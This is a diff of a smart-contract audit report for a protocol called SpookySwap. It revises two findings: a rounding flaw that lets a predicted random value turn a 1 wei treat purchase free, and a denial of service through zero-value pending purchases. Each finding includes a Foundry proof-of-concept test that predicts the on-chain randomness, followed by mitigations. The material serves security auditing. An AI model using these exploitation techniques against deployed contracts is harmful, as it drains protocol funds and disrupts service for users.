@@ -123,7 +123,47 @@ Implement a mapping that indicates which treat name has been already added ti `t
     }
 ```
 
-## [H-3] Denial of Service when `random = 2` `costMultiplierNumerator=2 and costMultiplierDenominator`, allows malicious users to make `treats:Pending` at any price.
+## [H-3] treats with 1 wei cost, spookied at `random = 1 => requiredCost:half-price` are rounded to zero. leading to free purchases.
+
+**Description:** By predicting `random = 1` `SpookySwap:trickOrTreat` malicious users can buy `Treats` for free, due to divisions are exact in solidity `1/2` will be rounded as `0`, doing so `requiredCost`to be 0, enabling free purchases, notice that `Treats` can repriced and traded at higher prices.
+
+```diff
+-   uint256 requiredCost = (treat.cost * costMultiplierNumerator) / costMultiplierDenominator;
+```
+
+**Impact:** This vulnerability only affects `1 wei` per purchase, though can be considered as hight due to Protocol's fund discrepancies.
+
+**Proof of Concept:**
+
+```javascript
+    function testTreatsAt1WeiForFree() public {
+        protocol.addTreat("candy", 1 wei, "uri1");
+
+        uint256 tokenId = protocol.nextTokenId();
+        //predict random = 1
+        uint256 random;
+        while (true) {
+            uint256 timestramp = block.timestamp;
+            random = uint256(keccak256(abi.encodePacked(timestramp, address(user), tokenId, block.prevrandao))) % 1000 + 1;
+            if (random == 1) {
+                break;
+            }
+            vm.warp(timestramp + 1);
+        }
+
+        uint256 balanceBefore = address(user).balance;
+        vm.prank(user);
+        //purchase a 1 wei Treat cost for free
+        protocol.trickOrTreat{ value: 1 ether }("candy");
+        //balance before and after equuality
+        assert(address(user).balance == balanceBefore);
+    }
+```
+
+**Recommneded Mitigation:**
+
+- Usage of fixed-point arithmetic
+- Beware of presicion loss
 
 # Medium
 
@@ -286,4 +326,40 @@ Implement a mapping that indicates which treat name has been already added ti `t
 - use low level `addres.call` instead
 - in case of DOS transfer ownership
 
-## [M-5] treats with 1 wei cost, spookied at half price are rounded to zero,
+## [M-5] Potential Denial of Service when `random = 2` `costMultiplierNumerator=2 and costMultiplierDenominator`, allows malicious users to make `treats:Pending` of any price.
+
+**Description:** Due to deterministic randomdoness `SpookySwap:random`, malicious users, can set aside continously any amount of `treats` by sending `0 ether` on `SpookySwap:trickOrTreat` if `random = 2`. they might not have the intention of `SpookySwap:resolveTrick` but are overloading the protocol, abusing the `pending` mechanism.
+
+**Impact:** Although it does not affect `Owner` fee collect, the lack of `minimun` value allows them to overload the protocol.
+
+**Proof of Concept:**
+
+When a `Treat` is set as pending it emits the `Swapped` Event.
+
+```javascript
+    function testDOSonPendingMechanism() public {
+        protocol.addTreat("candy", 1 ether, "uri1");
+        uint256 tokenId = protocol.nextTokenId();
+        uint256 random;
+        //look for random value equals to 2
+        while (true) {
+            uint256 timestramp = block.timestamp;
+            random = uint256(keccak256(abi.encodePacked(timestramp, address(user), tokenId, block.prevrandao))) % 1000 + 1;
+            if (random == 2) {
+                break;
+            }
+            vm.warp(timestramp + 1);
+        }
+
+        vm.prank(user);
+        vm.expectEmit();
+        emit Swapped(address(user), "candy", tokenId);
+        //call with zero value
+        protocol.trickOrTreat{ value: 0 }("candy");
+    }
+```
+
+**Recommneded Mitigation:**
+
+1. Minimum payment required
+2. Rate Limiting: a mechanism to limit the amount of pending items
